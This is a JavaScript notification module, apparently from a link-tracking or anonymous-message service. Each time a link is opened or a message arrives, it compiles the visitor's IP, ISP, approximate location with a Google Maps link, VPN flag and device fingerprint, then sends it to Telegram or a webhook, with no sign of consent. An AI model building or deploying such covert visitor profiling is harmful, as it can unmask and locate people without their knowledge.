// Push notifications for views + messages. Builds a technical, structured
// report (not just emoji labels) with a prefilled Google Maps link, and
// sends it via Telegram (HTML parse_mode) and/or a generic JSON webhook.

function escHtml(s) {
  return String(s ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

export function mapsUrl(fp) {
  if (fp.lat != null && fp.lon != null && fp.lat !== 0 && fp.lon !== 0) {
    return `https://www.google.com/maps?q=${fp.lat},${fp.lon}`;
  }
  const q = [fp.city, fp.region, fp.country].filter(Boolean).join(", ");
  return q ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(q)}` : "";
}

export function buildReport(kind, fp, extra = {}) {
  const maps = mapsUrl(fp);
  const loc = [fp.city, fp.region, fp.country].filter(Boolean).join(", ") || "Unknown";
  const dev = [fp.device_model, fp.os, fp.os_version].filter(Boolean).join(" ") || fp.device || "Unknown device";
  const suspicious = !!fp.is_hosting;
  const when = new Date();

  const titleHtml = kind === "message"
    ? `💌 <b>New message</b>${extra.handle ? ` from <b>@${escHtml(extra.handle)}</b>` : ""}`
    : `👀 <b>Link opened</b>${extra.slug ? ` <code>/${escHtml(extra.slug)}</code>` : ""}`;

  const lines = [];
  if (kind === "message") {
    lines.push(`💬 <i>"${escHtml((extra.message || "").slice(0, 300))}"</i>`, "");
  }

  lines.push(`<b>Location</b>: ${escHtml(loc)}${fp.postal ? ` (${escHtml(fp.postal)})` : ""}`);
  if (maps) lines.push(`🗺️ <a href="${maps}">Open in Google Maps</a>`);
  lines.push(`<b>Network</b>: ${escHtml(fp.isp || "Unknown")}${fp.asn ? ` · AS${escHtml(String(fp.asn))}` : ""}`);
  lines.push(`<b>IP</b>: <code>${escHtml(fp.ip)}</code>${fp.colo ? ` · edge PoP ${escHtml(fp.colo)}` : ""}`);
  if (suspicious) lines.push(`⚠️ <i>Network name matches hosting/VPN/proxy patterns — this may not be a real residential visitor.</i>`);

  lines.push("");
  lines.push(`<b>Device</b>: ${escHtml(dev)}${fp.model_source === "viewport" ? " <i>(estimated from screen size)</i>" : ""}`);
  lines.push(`<b>Browser</b>: ${escHtml(fp.browser || "?")} ${escHtml(fp.browser_version || "")} · opened via ${escHtml(fp.source || "?")}`);
  if (fp.viewport || fp.screen) lines.push(`<b>Viewport/Screen</b>: ${escHtml(fp.viewport || "?")} / ${escHtml(fp.screen || "?")} · DPR ${escHtml(fp.dpr || "?")}`);
  if (fp.platform || fp.cores || fp.mem) {
    lines.push(`<b>Platform</b>: ${escHtml(fp.platform || "?")}${fp.cores ? ` · ${fp.cores} cores` : ""}${fp.mem ? ` · ${escHtml(fp.mem)} GB RAM` : ""}`);
  }
  lines.push(`<b>Locale</b>: ${escHtml(fp.lang || "?")} · TZ ${escHtml(fp.timezone || "?")}`);

  if (extra.senderMessages != null) {
    lines.push("", `<b>This sender</b>: ${extra.senderMessages} message(s), ${extra.senderViews} view(s) total`);
  }
  lines.push(`<i>${when.toLocaleString("en-US", { timeZone: "UTC" })} UTC</i>`);
  if (extra.dashboardUrl) lines.push(`<a href="${extra.dashboardUrl}">Open full profile in dashboard →</a>`);

  const html = `${titleHtml}\n${lines.join("\n")}`;
  const plain = html
    .replace(/<a href="([^"]+)">([^<]*)<\/a>/g, "$2: $1")
    .replace(/<[^>]+>/g, "")
    .replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">");

  return { html, plain };
}

export async function notify(env, report) {
  const jobs = [];

  if (env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID) {
    jobs.push(
      fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: env.TELEGRAM_CHAT_ID,
          text: report.html,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      }).catch(() => {})
    );
  }

  if (env.NOTIFY_WEBHOOK_URL) {
    jobs.push(
      fetch(env.NOTIFY_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: report.plain }),
      }).catch(() => {})
    );
  }

  await Promise.allSettled(jobs);
}
